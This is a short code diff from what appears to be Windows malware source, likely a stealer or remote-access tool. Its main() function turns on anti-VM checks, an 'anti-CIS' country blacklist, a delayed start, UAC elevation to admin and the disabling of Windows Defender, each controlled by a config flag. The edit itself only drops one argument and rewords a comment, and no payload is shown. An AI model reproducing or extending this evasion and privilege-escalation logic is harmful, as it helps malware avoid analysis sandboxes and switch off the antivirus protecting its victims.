@@ -45,13 +45,13 @@ def main() -> None:
         AntiVm() # anti vm
 
     if config.get("antiCIS") == 1:
-        anti_cis(config.get("BLACKLIST")) # anti cis
+        anti_cis() # anti cis
         
     if config.get("executionDelay") != "":
         time.sleep(float(config["executionDelay"]))
         
     if config.get("UACAdmin") == 1:
-        run_as_admin() # run as admin
+        run_as_admin() # UAC Admin
         
     if config.get("defenderDisable") == 1:
         deseble_defander()
